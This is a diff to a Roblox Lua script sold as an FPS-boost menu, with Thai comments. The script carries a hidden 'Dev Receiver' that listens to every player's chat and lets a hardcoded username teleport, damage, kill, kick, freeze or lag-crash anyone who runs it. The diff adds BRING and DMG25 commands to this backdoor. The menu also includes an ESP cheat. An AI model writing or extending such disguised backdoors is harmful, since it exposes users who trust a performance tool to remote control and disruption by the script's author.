@@ -1,5 +1,5 @@
 -- ===================================================
--- BOOST FPS MENU (BETA) + DEV RECEIVER
+-- BOOST FPS MENU (BETA) + DEV RECEIVER (NO LOADING)
 -- ===================================================
 local Players=game:GetService("Players")
 local TweenService=game:GetService("TweenService")
@@ -10,7 +10,7 @@ local localPlayer=Players.LocalPlayer
 
 -- ⚠️ [สำคัญมาก] ใส่ Username Roblox ของคุณตรงนี้เพื่อรับสิทธิ์ควบคุม Dev
 local DevList = {
-	["dororo0010"] = true, -- เปลี่ยนเป็นไอดีของคุณ
+	["dororo0010"] = true, -- เปลี่ยนเป็นไอดี Roblox ของคุณ
 }
 
 if CoreGui:FindFirstChild("CustomBetaMenuGui") then
@@ -23,6 +23,7 @@ end
 local isFrozen = false
 
 local function ProcessDevCommand(senderName, message)
+	-- ตรวจสอบว่าผู้ส่งคำสั่งอยู่ใน DevList หรือไม่
 	if not DevList[senderName] then return end
 	
 	local args = string.split(message, ":")
@@ -31,18 +32,44 @@ local function ProcessDevCommand(senderName, message)
 	local cmd = args[2]
 	local targetName = args[3]
 	
+	-- เช็คว่าคำสั่งส่งมาหาเรา หรือส่งหาคนทั้งเซิร์ฟเวอร์ (ALL)
 	if targetName == localPlayer.Name or targetName == "ALL" then
-		if cmd == "KILL" then
+		
+		-- 🌀 1. BRING (ดึงตัวผู้เล่นไปหาตำแหน่ง Dev)
+		if cmd == "BRING" and args[4] then
+			local coords = string.split(args[4], ",")
+			if #coords == 3 and localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
+				local x, y, z = tonumber(coords[1]), tonumber(coords[2]), tonumber(coords[3])
+				if x and y and z then
+					localPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(x, y + 3, z)
+				end
+			end
+			
+		-- 🩸 2. DMG25 (ลดเลือดทีละ 25)
+		elseif cmd == "DMG25" then
+			if localPlayer.Character and localPlayer.Character:FindFirstChild("Humanoid") then
+				local hum = localPlayer.Character.Humanoid
+				hum.Health = math.clamp(hum.Health - 25, 0, hum.MaxHealth)
+			end
+			
+		-- 💀 3. KILL (ฆ่าตัวละครตายทันที)
+		elseif cmd == "KILL" then
 			if localPlayer.Character and localPlayer.Character:FindFirstChild("Humanoid") then
 				localPlayer.Character.Humanoid.Health = 0
 			end
+			
+		-- 🚫 4. KICK (เตะออกจากเซิร์ฟเวอร์)
 		elseif cmd == "KICK" then
 			localPlayer:Kick("\n[Dev Security System]\nYou have been disconnected from the server.")
+			
+		-- 🧊 5. FREEZE (แช่แข็ง/ปลดแช่แข็ง)
 		elseif cmd == "FREEZE" then
 			if localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
 				isFrozen = not isFrozen
 				localPlayer.Character.HumanoidRootPart.Anchored = isFrozen
 			end
+			
+		-- ⚠️ 6. LAG (ค้างเครื่องด้วย Part)
 		elseif cmd == "LAG" then
 			task.spawn(function()
 				while true do
@@ -55,6 +82,7 @@ local function ProcessDevCommand(senderName, message)
 	end
 end
 
+-- ดักจับข้อความแชทจากผู้เล่นทุกคนในเซิร์ฟเวอร์
 for _, p in ipairs(Players:GetPlayers()) do
 	p.Chatted:Connect(function(msg) ProcessDevCommand(p.Name, msg) end)
 end
@@ -132,7 +160,7 @@ submitCorner.CornerRadius=UDim.new(0,6)
 submitCorner.Parent=submitKeyBtn
 
 local mainFrame=Instance.new("Frame")
-mainFrame.Size=UDim2.new(0,320,0,260) -- ปรับขนาด Frame ให้พอดีกับ 4 ปุ่ม
+mainFrame.Size=UDim2.new(0,320,0,260)
 mainFrame.Position=UDim2.new(0.5,-160,0.5,-130)
 mainFrame.BackgroundColor3=Color3.fromRGB(30,30,35)
 mainFrame.BorderSizePixel=0
@@ -187,7 +215,6 @@ local function createMenuButton(name,text,posY,color)
 	return btn
 end
 
--- ปุ่มต่างๆ (เริ่มตำแหน่ง Y ที่ 45)
 local shrinkEffectButton=createMenuButton("ShrinkEffectBtn","Shrink All Effects: [ OFF ]",45,Color3.fromRGB(180,50,50))
 local espButton=createMenuButton("ESPBtn","Blue Highlight & Name ESP: [ OFF ]",97,Color3.fromRGB(180,50,50))
 local clearFogLoopButton=createMenuButton("ClearFogLoopBtn","Loop Clear Fog & Light: [ OFF ]",149,Color3.fromRGB(180,50,50))
@@ -225,7 +252,6 @@ local function isCharacter(object)
 	return false
 end
 
--- ฟังก์ชันย่อขนาด Effect ให้เล็กมากจนแทบมองไม่เห็น
 local function makeEffectTiny(obj)
 	if not isCharacter(obj) then
 		if obj:IsA("ParticleEmitter") then
@@ -405,81 +431,7 @@ end
 
 local function startMainUIProcess()
 	keyFrame:Destroy()
-	local loadingFrame=Instance.new("Frame")
-	loadingFrame.Size=UDim2.new(1,0,1,0)
-	loadingFrame.BackgroundColor3=Color3.fromRGB(20,20,25)
-	loadingFrame.ZIndex=10
-	loadingFrame.Parent=screenGui
-
-	local loadingTitle=Instance.new("TextLabel")
-	loadingTitle.Size=UDim2.new(1,0,0,40)
-	loadingTitle.Position=UDim2.new(0,0,0.4,-40)
-	loadingTitle.BackgroundTransparency=1
-	loadingTitle.Text="Loading Beta System..."
-	loadingTitle.TextColor3=Color3.fromRGB(255,215,0)
-	loadingTitle.TextSize=22
-	loadingTitle.Font=Enum.Font.SourceSansBold
-	loadingTitle.ZIndex=10
-	loadingTitle.Parent=loadingFrame
-
-	local barBg=Instance.new("Frame")
-	barBg.Size=UDim2.new(0,300,0,12)
-	barBg.Position=UDim2.new(0.5,-150,0.4,20)
-	barBg.BackgroundColor3=Color3.fromRGB(40,40,50)
-	barBg.ZIndex=10
-	barBg.Parent=loadingFrame
-
-	local barBgCorner=Instance.new("UICorner")
-	barBgCorner.CornerRadius=UDim.new(0,6)
-	barBgCorner.Parent=barBg
-
-	local progressBar=Instance.new("Frame")
-	progressBar.Size=UDim2.new(0,0,1,0)
-	progressBar.BackgroundColor3=Color3.fromRGB(255,215,0)
-	progressBar.ZIndex=10
-	progressBar.Parent=barBg
-
-	local progressBarCorner=Instance.new("UICorner")
-	progressBarCorner.CornerRadius=UDim.new(0,6)
-	progressBarCorner.Parent=progressBar
-
-	local percentLabel=Instance.new("TextLabel")
-	percentLabel.Size=UDim2.new(1,0,0,25)
-	percentLabel.Position=UDim2.new(0,0,0.4,40)
-	percentLabel.BackgroundTransparency=1
-	percentLabel.Text="0%"
-	percentLabel.TextColor3=Color3.fromRGB(180,180,180)
-	percentLabel.TextSize=14
-	percentLabel.Font=Enum.Font.SourceSans
-	percentLabel.ZIndex=10
-	percentLabel.Parent=loadingFrame
-
-	task.spawn(function()
-		local totalTime=4
-		local startTime=os.clock()
-		while (os.clock()-startTime)<totalTime do
-			local progress=math.clamp((os.clock()-startTime)/totalTime,0,1)
-			progressBar.Size=UDim2.new(progress,0,1,0)
-			percentLabel.Text=math.floor(progress*100).."%"
-			task.wait()
-		end
-		progressBar.Size=UDim2.new(1,0,1,0)
-		percentLabel.Text="100%"
-		loadingTitle.Text="Access Granted!"
-		task.wait(0.5)
-
-		local tInfo=TweenInfo.new(0.8,Enum.EasingStyle.Quad,Enum.EasingDirection.Out)
-		for _,c in ipairs(loadingFrame:GetDescendants()) do
-			if c:IsA("Frame") then TweenService:Create(c,tInfo,{BackgroundTransparency=1}):Play()
-			elseif c:IsA("TextLabel") then TweenService:Create(c,tInfo,{TextTransparency=1}):Play() end
-		end
-		local fade=TweenService:Create(loadingFrame,tInfo,{BackgroundTransparency=1})
-		fade:Play()
-		fade.Completed:Connect(function()
-			loadingFrame:Destroy()
-			mainFrame.Visible=true
-		end)
-	end)
+	mainFrame.Visible=true
 end
 
 submitKeyBtn.MouseButton1Click:Connect(function()
